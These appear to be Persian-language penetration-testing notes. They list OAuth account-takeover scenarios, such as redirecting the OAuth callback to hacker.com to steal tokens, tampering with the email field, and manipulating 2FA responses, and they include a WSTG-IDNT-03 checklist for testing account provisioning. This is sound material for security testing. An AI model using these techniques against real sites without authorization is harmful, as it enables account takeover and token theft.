#### زمانی که کد 2FA برای شما ارسال می‌شود، علاوه بر استفاده از ابزارهایی مثل Intruder،
#### بیاManipulation روی Response را هم امتحان کن.





----------------------------------------


# Test OAuth
### سناریو 1:

#### با ایمیل khorzokhanorg@gmail.com ثبت‌نام کن (بدون کد یا اطلاعات اضافی).
#### حالا دوباره با Google OAuth با همین ایمیل ثبت‌نام کن. اگر وارد همان حساب شدی،
#### به این ترتیب، account takeover انجام دادی.

### سناریو 17: Insufficient Redirect URI Validation

#### وقتی از OAuth استفاده می‌کنی، اگر پس از انجام OAuth، یک redirect به سمت target.co انجام شود،
#### سعی کن که redirect را به سمت سایت hacker.com تغییر دهی.
#### این کار باعث می‌شود که بتوانی توکن احراز هویت را بدزدی.


### سناریو 19:

#### در سایتی که برای ثبت‌نام OAuth دارد، وارد شو و اگر دسترسی به ایمیل نشان داده شد،
#### دستگاه دسترسی به ایمیل را غیرفعال کن. حالا که به سایت target redirect شدی،
#### ممکن است از تو ایمیل خواسته شود (چون دسترسی به ایمیل را غیرفعال کرده‌ای).
#### در این صورت، ایمیل غیرمجاز وارد کن و احتمالاً به حساب غیرمجاز redirect می‌شی بدون هیچ‌گونه احراز هویت.


### سناریو 20:

#### ممکن است بتوانی با یک ایمیل اولیه به صورت معمولی ثبت‌نام کنی و یک حساب بسازی.
#### حالا از حساب خارج شو و دوباره با همان ایمیل از طریق OAuth یک حساب جدید با پسورد جدید بسازی.

### سناریو 25:

#### وقتی با OAuth ثبت‌نام می‌کنی، در انتها ممکن است درخواستی به target.com ارسال شود
#### که ممکن است فیلدی از بدنه درخواست شامل ایمیل به سمت سرور ارسال گردد.
#### اگر ایمیل مربوط به ادمین یا ایمیل سازمانی باشد، ممکن است بتوانی account takeover انجام دهی.


### سناریو 46:

#### در سایتی که OAuth دارد، وارد حساب جدیدی با OAuth Google شو.
#### حالا به قسمت تغییر ایمیل برو و ایمیل را تغییر بده و از حساب خارج شو.
#### دوباره با همان ایمیل اولیه از OAuth Google وارد شو.
#### حالا می‌بینی که به حسابی وارد شده‌ای که ایمیل دوم را در آن تنظیم کرده بودی.







-----------------------------------------

# Test Account Provisioning Process 

### WSTG-IDNT-03


### بررسی فرآیند اختصاص حساب توسط یک حساب کاربری به کاربران دیگر
#### اهداف تست:

### تعیین نقش‌ها:
#### کدام نقش‌ها می‌توانند حساب‌های کاربری جدیدی را به دیگران اختصاص دهند؟
 ##### بررسی اینکه آیا همه کاربران می‌توانند این کار را انجام دهند یا محدود به نقش خاصی (مثلاً Admin) است.

#### تأیید درخواست‌ها:
##### آیا اختصاص حساب نیاز به بررسی، تأیید و مجوز دارد؟
 ##### در مورد حذف حساب (De-provisioning)، آیا فرآیند مشابهی برای بررسی و تأیید وجود دارد؟

#### مدیریت توسط مدیر:
##### آیا یک مدیر می‌تواند حساب‌های سایر مدیران را تغییر دهد؟
##### آیا دسترسی به مدیریت حساب‌ها محدود به نقش‌های خاص است؟

#### امتیازات کاربران:
##### آیا یک مدیر یا کاربر می‌تواند حساب‌هایی با امتیاز بالاتر از خود را ایجاد، تغییر یا حذف کند؟

#### مدیریت حساب خود:
##### آیا کاربر یا مدیر می‌تواند حساب خود را حذف کند؟

#### مدیریت منابع کاربران حذف‌شده:
##### فایل‌ها یا منابع مرتبط با کاربری که حذف شده‌اند، چگونه مدیریت می‌شوند؟ آیا این منابع واقعا حذف میشوند؟ 
##### آیا این فایل‌ها حذف می‌شوند یا دسترسی به آن‌ها به فرد دیگری منتقل می‌شود؟

#### سناریوهای تست:
##### بررسی امکان اختصاص حساب توسط کاربری که نباید این قابلیت را داشته باشد:

#### اطمینان از اینکه فقط نقش‌های مجاز (مثل Admin) می‌توانند حساب اختصاص دهند.
#### تست:
##### با یک کاربر عادی وارد سیستم شوید و تلاش کنید حساب جدیدی برای کاربران دیگر اختصاص دهید.
##### نتیجه را بررسی کنید؛ سیستم باید این درخواست را رد کند.

#### بررسی امکان حذف حساب Admin توسط یک کاربر:

##### اطمینان از اینکه کاربران عادی نمی‌توانند حساب مدیران را حذف کنند.
##### تست:
##### با یک کاربر عادی وارد شوید و تلاش کنید حساب Admin را حذف کنید.
##### سیستم باید دسترسی به این عملیات را مسدود کند.

#### بررسی امکان حذف حساب سایر کاربران توسط یک کاربر:

##### هدف: جلوگیری از دسترسی غیرمجاز کاربران به حذف حساب دیگران.
#### تست:
##### با یک کاربر عادی وارد سیستم شوید و تلاش کنید حساب کاربر دیگری را حذف کنید.
        
#### بررسی امکان اختصاص حساب با امتیازات بالاتر توسط یک کاربر:

##### هدف: اطمینان از اینکه کاربران نمی‌توانند حساب‌هایی با امتیاز بیشتر از سطح خود ایجاد کنند.
#### تست:
##### با یک کاربر عادی وارد سیستم شوید و تلاش کنید یک حساب Admin ایجاد کنید.

#### بررسی حذف حساب خود توسط کاربر:

##### هدف: جلوگیری از عملیات‌هایی که ممکن است سیستم یا مدیریت کاربران را دچار اختلال کند.
##### تست:
##### با یک کاربر وارد شوید و تلاش کنید حساب خود را حذف کنید.
##### بررسی کنید که آیا سیستم این درخواست را محدود می‌کند.

#### مدیریت فایل‌های کاربران حذف‌شده:

##### هدف: تعیین اینکه منابع و فایل‌های کاربران حذف‌شده چگونه مدیریت می‌شوند.
##### تست:
##### یک کاربر ایجاد کنید و فایل‌هایی مرتبط با آن بارگذاری کنید.
##### سپس حساب کاربر را حذف کنید و بررسی کنید که آیا فایل‌ها نیز حذف شده‌اند یا به کاربر دیگری منتقل شده‌اند.

#### فازینگ درخواست‌های مرتبط با اختصاص حساب:

##### هدف: بررسی آسیب‌پذیری در فرآیند اختصاص حساب با ارسال داده‌های نامعتبر یا دستکاری‌شده.
####  تست:
##### با ابزارهایی مثل Burp Suite یا Postman، درخواست اختصاص حساب را ارسال کنید و مقادیر مربوط به نقش، سطح دسترسی یا کاربر هدف را تغییر دهید.





------------------






